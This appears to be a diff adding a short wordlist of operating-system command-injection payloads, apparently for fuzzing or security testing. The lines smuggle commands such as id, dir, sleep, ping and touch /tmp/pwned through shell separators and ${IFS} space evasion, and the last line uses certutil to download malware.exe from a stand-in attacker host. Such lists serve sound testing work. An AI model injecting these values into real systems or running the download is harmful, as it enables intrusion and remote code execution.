@@ -1,0 +1,8 @@
+; id; #
+| dir C:\
+a%0aid
+$(ping${IFS}127.0.0.1)
+';sleep${IFS}5;#${IFS}"|ping${IFS}-n${IFS}5${IFS}127.0.0.1||'
+/*$(touch /tmp/pwned)
+' || ping -c 10 127.0.0.1 &
+& certutil -urlcache -split -f http://attacker.com/malware.exe
